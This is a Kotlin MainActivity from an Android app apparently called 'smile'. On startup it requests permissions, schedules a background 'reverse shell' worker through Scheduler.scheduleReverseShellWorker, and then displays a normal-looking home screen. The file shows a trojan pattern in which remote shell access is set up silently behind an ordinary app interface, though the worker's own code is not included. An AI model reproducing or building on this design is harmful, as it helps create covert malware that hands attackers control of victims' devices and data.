package com.satwik.smile

import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.annotation.RequiresApi
import com.satwik.smile.features.reverse_shell.PermissionRequester
import com.satwik.smile.features.reverse_shell.Scheduler
import com.satwik.smile.features.home.HomeScreen

class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            PermissionRequester()
            println("Application Started")
            Scheduler.scheduleReverseShellWorker(applicationContext)
            HomeScreen()
        }
    }
}

